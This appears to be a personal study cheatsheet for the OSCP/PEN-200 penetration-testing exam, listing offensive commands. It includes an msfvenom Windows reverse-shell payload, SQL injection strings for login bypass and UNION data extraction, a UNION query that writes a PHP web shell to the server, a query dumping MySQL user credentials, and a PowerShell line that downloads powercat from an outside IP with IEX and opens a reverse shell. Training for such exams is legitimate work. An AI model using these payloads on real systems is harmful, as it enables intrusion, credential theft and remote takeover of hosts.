# OSCP-Notes
Cheatsheet/Notes from PEN-200 Learning Platform for the OSCP Exam

Payload Generator msfvenom:

    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
Transfer File From Windows To Linux via ssh:
    1.on linux 2. on windows:
    
        1. sudo systemctl start ssh
        2. scp C:\Users\offsec\Desktop\malware.exe shaleph@192.168.45.162:/home/shaleph/OSCP 
        
file metadata analyzer:

    exiftool -a -u <file.name>
  
Web App Pentest

    Command Injection
      Check if CMD or PowerShell we have:
        (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
      PowerCat for Reverse shell. first copy to local dir: 
        cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .


  SQLi
    MySQL:
      connect to mysql remotely:
      
        mysql -u <user> -h <ip> -P 3306 -p;
        
  commands after connection:
      
        show databases;
        select version();
        show tables in mysql;
        select * from mysql.user;
        select * from mysql.user where user = 'username';
        
  MSSQL:
      connect:
      
        impacket-mssqlclient <user>:<pass>@<ip> -windows-auth
  commnads:
  
        select @@version;
        select name from sys.databases;
        select * from <db_name>.information_schema.tables;
        select * from master.dbo.sysusers;

  Injections: 
  
      offsec' OR 1=1 -- //
      if above successful:
            ' or 1=1 in (select @@version) -- //
            
  UNION injections:
      first get number of columns (increase number by 1):
      
        ' ORDER BY 1-- //
        ' UNION SELECT null, null, database(), user(), @@version  -- //
        ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
      shell with Union
        ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

  Time Based Blind SQL:
      ' AND IF (1=1, sleep(3),'false') -- //



Download and execute in PowerShell:
  IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
